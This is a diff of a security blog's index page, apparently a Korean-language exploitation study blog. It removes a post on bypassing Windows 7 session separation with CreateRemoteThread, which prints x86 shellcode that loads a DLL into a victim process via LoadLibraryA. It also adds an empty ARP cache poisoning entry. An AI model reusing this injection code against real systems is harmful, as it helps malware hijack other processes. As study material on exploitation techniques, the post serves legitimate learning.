@@ -9,7 +9,8 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="Symantec Endpoint Protection 11.x, 12.x - Kernel Pool Overflow 참고할만한 문서들은 Data-only Pwning Microsoft Windows Kernel: Exploitation of Kernel Pool &hellip;">
+  <meta name="description" content="
+">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +66,35 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/14/arp-cache-poisoning/">ARP Cache Poisoning</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-14T21:22:47+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:22 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content">
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1915,117 +1945,6 @@ kernel memory, when exploiting custom vulnerabilities.</p>
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/04/15/createremotethread-bypass-windows-7-session-separation/">CreateRemoteThread. Bypass Windows 7 Session Separation</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-04-15T16:51:11+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:51 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><a href="http://syprog.blogspot.kr/2012/05/createremotethread-bypass-windows.html">CreateRemoteThread. Bypass Windows 7 Session Separation</a> 을 정리.</p>
-
-<h5>Opening the Victim Process</h5>
-
-<p>Target 에 어태치할때&hellip;</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>HANDLE WINAPI OpenProcess(
-</span><span class='line'>    DWORD dwDesiredAccess, /* PROCESS_ALL_ACCESS */
-</span><span class='line'>    BOOL bInheritHandle, /* FALSE */
-</span><span class='line'>    DWORD dwProcessID 
-</span><span class='line'>    );</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Reading the Shellcode</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>use 32
-</span><span class='line'>    ; offset of the LoadLibraryA address within the shellcode
-</span><span class='line'>    dd func
-</span><span class='line'>    ; save all registers
-</span><span class='line'>    push eax ebx ecx edx ebp edi esi
-</span><span class='line'>    ; get your EIP
-</span><span class='line'>    call next
-</span><span class='line'>next:
-</span><span class='line'>    pop eax
-</span><span class='line'>    mov ebx, eax
-</span><span class='line'>    ; get the address of the DLL name
-</span><span class='line'>    mov eax, string - next
-</span><span class='line'>    ; do this to avoid possible negative values (due to sign extend)
-</span><span class='line'>    movzx eax, al
-</span><span class='line'>    add eax, ebx
-</span><span class='line'>    ; pass it to the LoadLibraryA API
-</span><span class='line'>    push eax
-</span><span class='line'>    ; get the address of the LoadLibraryA function
-</span><span class='line'>    mov eax, func - next
-</span><span class='line'>    movzx eax, al
-</span><span class='line'>    add eax, ebx
-</span><span class='line'>    mov eax, [eax]
-</span><span class='line'>    ; call LoadLibraryA
-</span><span class='line'>    call eax
-</span><span class='line'>    ; restore registers
-</span><span class='line'>    pop esi edi ebp edx ecx ebx eax
-</span><span class='line'>    ; return
-</span><span class='line'>    ret
-</span><span class='line'>func dd 0x12345678 ; placeholder for the address
-</span><span class='line'>string:</span></code></pre></td></tr></table></div></figure>
-
-
-<p>메모리에 shellcode 를 넣고, DLL path 를 strcat() 한다. 그리고, <code>LoadLibraryA()</code> 어드레스를 채워준다. 채워줄때는 쉘코드 첫 DD 를 참조하여 <code>func</code> 의 offset 을 계산한다. 이 작업을 해야 usable 한 shellcode 가 된다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/9">&larr; Older</a>
@@ -2043,6 +1962,10 @@ kernel memory, when exploiting custom vulnerabilities.</p>
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/02/25/mnist-for-ml-beginners/">MNIST for ML Beginners</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/02/16/plaid-ctf-2015-one-null-byte/">Plaid CTF 2015 - One NULL Byte</a>
       </li>
     
@@ -2056,10 +1979,6 @@ kernel memory, when exploiting custom vulnerabilities.</p>
     
       <li class="post">
         <a href="/blog/2016/02/11/how2heap/">How2heap</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/02/11/racing-midi-messages-in-chrome/">Racing MIDI Messages in Chrome</a>
       </li>
     
   </ul>
